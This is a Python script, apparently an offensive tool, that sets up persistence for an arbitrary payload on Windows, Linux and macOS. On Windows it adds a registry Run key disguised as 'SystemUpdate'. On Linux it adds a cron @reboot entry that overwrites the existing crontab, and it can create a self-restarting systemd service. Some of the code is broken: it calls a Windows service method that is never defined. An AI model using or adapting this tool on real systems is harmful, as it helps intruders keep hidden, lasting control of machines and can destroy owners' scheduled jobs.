#!/usr/bin/env python3
"""
Multi-Platform Persistence Manager
Establishes persistence on Windows, Linux, and macOS
Author: Wan Mohamad Hanis bin Wan Hassan
"""

import os
import sys
import platform
import subprocess

class PersistenceManager:
    def __init__(self, payload_path: str):
        self.payload_path = payload_path
        self.os_type = platform.system()
    
    def windows_registry_persistence(self) -> bool:
        """Add to Windows registry Run key"""
        if self.os_type != 'Windows':
            return False
        
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run",
                                0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, self.payload_path)
            winreg.CloseKey(key)
            print("[+] Windows registry persistence established")
            return True
        except Exception as e:
            print(f"[!] Registry persistence failed: {e}")
            return False
    
    def linux_cron_persistence(self) -> bool:
        """Add cron job on Linux"""
        if self.os_type != 'Linux':
            return False
        
        try:
            cron_entry = f"@reboot {self.payload_path}\n"
            subprocess.run(['crontab', '-l'], capture_output=True)
            subprocess.run(['crontab', '-'], input=cron_entry.encode())
            print("[+] Linux cron persistence established")
            return True
        except Exception as e:
            print(f"[!] Cron persistence failed: {e}")
            return False
    
    def create_service(self, service_name: str) -> bool:
        """Create system service"""
        if self.os_type == 'Windows':
            return self._windows_service(service_name)
        elif self.os_type == 'Linux':
            return self._systemd_service(service_name)
        return False
    
    def _systemd_service(self, service_name: str) -> bool:
        """Create systemd service"""
        service_content = f"""[Unit]
Description={service_name}
After=network.target

[Service]
ExecStart={self.payload_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
        try:
            service_path = f"/etc/systemd/system/{service_name}.service"
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            subprocess.run(['systemctl', 'daemon-reload'])
            subprocess.run(['systemctl', 'enable', service_name])
            print(f"[+] Systemd service persistence established")
            return True
        except Exception as e:
            print(f"[!] Service creation failed: {e}")
            return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <payload_path>")
        sys.exit(1)
    
    pm = PersistenceManager(sys.argv[1])
    pm.windows_registry_persistence()
    pm.linux_cron_persistence()
